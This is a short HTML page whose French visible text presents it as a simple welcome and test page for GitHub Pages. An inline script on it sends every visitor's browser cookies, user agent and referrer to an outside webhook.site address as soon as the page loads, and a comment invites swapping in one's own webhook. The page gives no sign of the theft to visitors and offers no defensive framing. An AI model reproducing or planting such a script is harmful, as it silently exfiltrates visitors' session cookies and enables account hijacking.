<!DOCTYPE html>
<html>
<head>
    <title>Capture Token</title>
</head>
<body>
    <h1>Bienvenue sur mon site web</h1>
    <p>Ceci est une page de test pour GitHub Pages.</p>
    <script>
        // Remplacez par l'URL de votre webhook
        const webhookUrl = 'https://webhook.site/#!/view/1d5567ef-932d-4a8d-a0bb-73e154fbb06b';

        // Envoyer les cookies au webhook
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                cookies: document.cookie,
                userAgent: navigator.userAgent,
                referrer: document.referrer
            }),
        });
    </script>
</body>
</html>
